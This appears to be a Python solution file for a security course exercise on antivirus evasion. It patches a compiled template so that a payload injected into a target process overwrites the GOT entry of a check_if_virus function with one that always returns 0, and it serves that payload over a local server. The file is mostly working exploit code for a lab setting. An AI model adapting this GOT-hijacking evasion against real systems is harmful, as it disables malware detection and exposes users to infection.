import server
import struct
from addresses import CHECK_IF_VIRUS_GOT, CHECK_IF_VIRUS_ALTERNATIVE, address_to_bytes

PATH = "q3.template"

class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
        # Return a payload that will replace the GOT entry for check_if_virus
        # with another function of a similar signature, that will return 0.
        # 1. You can assume we already compiled q3.c into q3.template.
        # 2. Use CHECK_IF_VIRUS_GOT and CHECK_IF_VIRUS_ALTERNATIVE.
        byte_pid = address_to_bytes(pid)
        byte_addr = address_to_bytes(CHECK_IF_VIRUS_GOT)
        byte_new = address_to_bytes(CHECK_IF_VIRUS_ALTERNATIVE)
        with open(PATH, 'rb') as reader:
            data = reader.read()
        byte_dummy = address_to_bytes(0x12345678)
        data = data.replace(byte_dummy,byte_pid,1)
        data = data.replace(byte_dummy,byte_addr,1)
        data = data.replace(byte_dummy,byte_new,1)
        return data

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

